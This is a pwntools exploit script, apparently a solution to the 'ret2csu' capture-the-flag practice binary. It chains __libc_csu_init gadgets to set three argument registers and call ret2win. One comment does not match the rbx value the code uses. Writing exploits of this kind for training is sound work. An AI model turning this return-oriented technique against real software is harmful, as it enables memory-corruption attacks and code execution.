from pwn import *
io = process("./ret2csu")

padding = b"A" * 40
ret2winPlt = p64(0x400510)
ret2winGot = p64(0x601020)

ret2csu = p64(0x400680)#mov rdx,r15;mov rsi,r14;mov edi,r13;call   QWORD PTR [r12+rbx*8]
pops = p64(0x40069a) #pop rbx;pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
popRdi = p64(0x4006a3)
popRbp = p64(0x400588)
init = p64(0x600e38)

r13 = p64(0xdeadbeefdeadbeef) #rdi
r14 = p64(0xcafebabecafebabe) #rsi 
r15 = p64(0xd00df00dd00df00d) #rdx

r12 = p64(0)
rbx = p64(786887) #786948 * 8 = 0x601020
rbp = p64(786888) #rbx + 1

exploit = padding + pops + rbx + rbp + r12 + r13 + r14 + r15 + ret2csu + b"A" * 7 * 8 + popRdi + r13 + ret2winPlt
io.send(exploit)
io.recvuntil(b"Thank you!\n")

print(io.recv(1024).decode()[:-1])
